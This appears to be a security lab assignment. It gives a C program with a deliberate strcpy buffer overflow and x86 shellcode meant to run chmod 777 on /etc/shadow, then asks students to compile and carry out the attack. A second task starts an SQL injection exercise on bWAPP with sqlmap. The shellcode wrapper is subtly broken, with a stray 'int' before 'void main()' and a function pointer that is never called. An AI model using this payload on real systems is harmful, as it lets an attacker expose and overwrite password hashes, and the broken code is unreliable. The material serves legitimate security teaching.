# Task 1: Software buffer overflow attack
 
Given a vulnerable C program 
```
#include <stdio.h>
#include <string.h>

int main(int argc, char* argv[])
{
	char buffer[16];
	strcpy(buffer,argv[1]);
	return 0;
}
```
and a shellcode in C. This shellcode executes chmod 777 /etc/shadow without having to sudo to escalate privilege
```
#include <stdio.h>
#include <string.h>

unsigned char code[] = \
"\x89\xc3\x31\xd8\x50\xbe\x3e\x1f"
"\x3a\x56\x81\xc6\x23\x45\x35\x21"
"\x89\x74\x24\xfc\xc7\x44\x24\xf8"
"\x2f\x2f\x73\x68\xc7\x44\x24\xf4"
"\x2f\x65\x74\x63\x83\xec\x0c\x89"
"\xe3\x66\x68\xff\x01\x66\x59\xb0"
"\x0f\xcd\x80";

int
void main() {
    int (*ret)() = (int(*)())code;
}
```
**Question 1**:
- Compile both C programs and shellcode to executable code. 
- Conduct the attack so that when C executable code runs, shellcode willc also be triggered. 
  You are free to choose Code Injection or Environment Variable approach to do. 
- Write step-by-step explanation and clearly comment on instructions and screenshots that you have made to successfully accomplished the attack.
**Answer 1**: Must conform to below structure:

Description text (optional)


``` 
    code block (optional)
```

output screenshot (optional)

**Conclusion**: comment text about the screenshot or simply answered text for the question

# Task 2: Attack on the database of bWapp 
- Install bWapp (refer to quang-ute/Security-labs/Web-security). 
- Install sqlmap.
